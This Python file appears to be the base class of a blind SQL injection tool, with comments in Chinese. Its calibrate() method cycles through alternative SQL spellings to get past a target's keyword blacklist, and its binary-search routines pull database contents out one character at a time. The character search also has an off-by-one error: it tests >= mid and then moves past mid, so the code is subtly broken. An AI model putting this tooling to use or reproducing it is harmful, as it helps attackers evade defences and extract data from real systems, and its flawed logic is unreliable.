# -*- coding: utf-8 -*-
"""注入技术抽象基类

v1.1：引入 calibrate()。当目标黑名单把 >= / LENGTH / SUBSTR / ASCII
等写法也拦掉时，技术会在探测阶段轮换方言提供的多种写法，
挑出一组「当前过滤下仍然能正确求值」的组合再开始盲注。
"""


class BaseTechnique:
    name = "base"

    # >= 的多种等价写法（模板），按顺序校准
    GTE_PATTERNS = [
        "({l})>=({r})",
        "NOT(({l})<({r}))",
        "(({l})>({r})||({l})=({r}))",
    ]

    def __init__(self, requester, detector, dialect, tamper_chain=None,
                 log=None, workers=8, **kwargs):
        self.req = requester
        self.det = detector
        self.dialect = dialect
        self.tamper = tamper_chain
        self.log = log
        self.workers = workers

        # 当前采用的表达式模板（calibrate 会覆盖）
        self.gte_pat = self.GTE_PATTERNS[0]
        self.sub_tpl = dialect.substr_templates()[0]
        self.ascii_tpl = dialect.ascii_templates()[0]
        self.len_tpl = dialect.length_templates()[0]

    # ---------------- 基础 ----------------
    def _t(self, s):
        return self.tamper.apply(s) if self.tamper else s

    def probe(self):
        raise NotImplementedError

    def extract(self, sql_expr):
        raise NotImplementedError

    def extract_length(self, sql_expr):
        return len(self.extract(sql_expr))

    def _cond_true(self, condition):
        raise NotImplementedError

    # ---------------- 表达式构造 ----------------
    def gte(self, left, right):
        return self.gte_pat.format(l=left, r=right)

    def sub(self, sql, pos, length):
        return self.sub_tpl.format(sql=sql, pos=pos, len=length)

    def ascii(self, sql):
        return self.ascii_tpl.format(sql=sql)

    def length(self, sql):
        return self.len_tpl.format(sql=sql)

    # ---------------- 表达式校准 ----------------
    def calibrate(self):
        """挑一组当前过滤下可用的表达式写法（best-effort，失败则保留默认）。"""
        # 1) >= 写法：用 2>=1 真 / 1>=2 假 验证
        for pat in self.GTE_PATTERNS:
            try:
                if self._cond_true(pat.format(l="2", r="1")) and \
                   not self._cond_true(pat.format(l="1", r="2")):
                    self.gte_pat = pat
                    break
            except Exception:
                continue

        # 2) 取码写法（ASCII+SUBSTR 组合）：用 'A'(65) 验证
        found = False
        for sub_tpl in self.dialect.substr_templates():
            for asc_tpl in self.dialect.ascii_templates():
                try:
                    a = asc_tpl.format(sql=sub_tpl.format(sql="'A'", pos=1, len=1))
                    if self._cond_true(self.gte(a, "65")) and \
                       not self._cond_true(self.gte(a, "66")):
                        self.sub_tpl, self.ascii_tpl = sub_tpl, asc_tpl
                        found = True
                        break
                except Exception:
                    continue
            if found:
                break

        # 3) 长度写法：用 'AB'(len=2) 验证
        for len_tpl in self.dialect.length_templates():
            try:
                l = len_tpl.format(sql="'AB'")
                if self._cond_true(self.gte(l, "2")) and \
                   not self._cond_true(self.gte(l, "3")):
                    self.len_tpl = len_tpl
                    break
            except Exception:
                continue

    # ---------------- 二分查找（默认实现） ----------------
    def _binary_search_char(self, sql_expr, pos):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            cond = self.gte(self.ascii(self.sub(sql_expr, pos, 1)), str(mid))
            if self._cond_true(cond):
                low = mid + 1
            else:
                high = mid
        return chr(low)

    def _binary_search_length(self, sql_expr, max_len=300):
        low, high = 0, max_len
        while low < high:
            mid = (low + high) // 2
            cond = self.gte(self.length(sql_expr), str(mid + 1))
            if self._cond_true(cond):
                low = mid + 1
            else:
                high = mid
        return low
